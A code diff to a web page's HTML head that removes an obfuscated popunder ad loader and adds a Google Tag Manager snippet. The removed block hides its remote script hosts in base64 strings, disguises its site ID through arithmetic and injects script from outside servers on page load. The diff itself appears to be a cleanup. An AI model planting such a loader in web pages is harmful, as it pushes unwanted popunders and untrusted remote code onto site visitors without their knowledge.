@@ -260,56 +260,18 @@
         }
       }
     </style>
-    <!-- Hosted Demo Ad Script (Optional: Remove this script block for clean self-hosted deployments) -->
-    <script type="text/javascript" data-cfasync="false">
-      /*<![CDATA[/* */
-      (function () {
-        var g = window,
-          h = "e94f3803a2dc20c3edf2e73823934889",
-          f = [
-            ["siteId", 824 - 860 * 253 - 930 - 6 + 5502765],
-            ["minBid", 0],
-            ["popundersPerIP", "0"],
-            ["delayBetween", 0],
-            ["default", false],
-            ["defaultPerDay", 0],
-            ["topmostLayer", "auto"],
-          ],
-          l = [
-            "d3d3LmludGVsbGlwb3B1cC5jb20vYk9yZ0NoYXJ0Lm1pbi5jc3M=",
-            "ZDNtcjd5MTU0ZDJxZzUuY2xvdWRmcm9udC5uZXQvd3V4a1ZBL3dqcy5jb29raWUubWluLmpz",
-          ],
-          i = -1,
-          z,
-          e,
-          r = function () {
-            clearTimeout(e);
-            i++;
-            if (l[i] && !(1815583359000 < new Date().getTime() && 1 < i)) {
-              z = g.document.createElement("script");
-              z.type = "text/javascript";
-              z.async = !0;
-              var d = g.document.getElementsByTagName("script")[0];
-              z.src = "https://" + atob(l[i]);
-              z.crossOrigin = "anonymous";
-              z.onerror = r;
-              z.onload = function () {
-                clearTimeout(e);
-                g[h.slice(0, 16) + h.slice(0, 16)] || r();
-              };
-              e = setTimeout(r, 5e3);
-              d.parentNode.insertBefore(z, d);
-            }
-          };
-        if (!g[h]) {
-          try {
-            Object.freeze((g[h] = f));
-          } catch (e) {}
-          r();
-        }
-      })();
-      /*]]>/* */
+    <script
+      async
+      src="https://www.googletagmanager.com/gtm.js?id=GTM-M826QFBJ"
+    ></script>
+    <script>
+      window.dataLayer = window.dataLayer || [];
+      function gtag() {
+        dataLayer.push(arguments);
+      }
+      gtag("js", new Date());
     </script>
+    <!-- Hosted Demo Ad Script (Optional: Remove this script block for clean self-hosted deployments) -->
   </head>
   <body>
     <div id="app-splash-screen">
